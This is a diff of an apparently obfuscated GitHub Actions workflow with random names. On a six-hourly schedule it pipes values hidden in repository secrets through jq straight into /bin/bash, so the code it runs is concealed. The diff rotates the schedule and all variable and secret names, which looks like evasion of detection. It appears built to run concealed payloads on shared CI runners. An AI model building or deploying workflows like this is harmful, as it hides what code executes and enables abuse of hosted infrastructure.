@@ -1,28 +1,23 @@
 name: fudouding1938
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 1/6 * * *'
+    - cron: '44 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fudouding1938
         env:
-          szv6164: ${{ secrets.szv6164 }}
+          dbr59302: ${{ secrets.dbr59302 }}
         run: |
-          echo $szv6164 | jq -r .zz859 | /bin/bash
-          echo $dskg67741 | jq -r .mvr423 | /bin/bash
-          echo $ggni13556 | jq -r .t74166 | /bin/bash
-          echo $azih85 | jq -r .g97443 | /bin/bash
-          echo $zb02456 | jq -r .qdrm96010 | /bin/bash
-          echo $x9 | jq -r .xcpjo1 | /bin/bash
-          echo $lins624 | jq -r .znk66 | /bin/bash
-          echo $ue65086 | jq -r .olq1540 | /bin/bash
-          echo $bv510 | jq -r .g842 | /bin/bash
-          echo $yqvm8966 | jq -r .w782 | /bin/bash
-          echo $edf72925 | jq -r .owa04131 | /bin/bash
+          echo $dbr59302 | jq -r .ni632 | /bin/bash
+          echo $wizor24 | jq -r .c1 | /bin/bash
+          echo $fma77976 | jq -r .m1 | /bin/bash
+          echo $gj14040 | jq -r .idrw2046 | /bin/bash
+          echo $js54 | jq -r .zvfl39835 | /bin/bash
+          echo $ry3290 | jq -r .lwhnz97240 | /bin/bash
+          echo $ux29 | jq -r .cumpx3674 | /bin/bash
+          echo $csye34733 | jq -r .vjaoh4 | /bin/bash
 
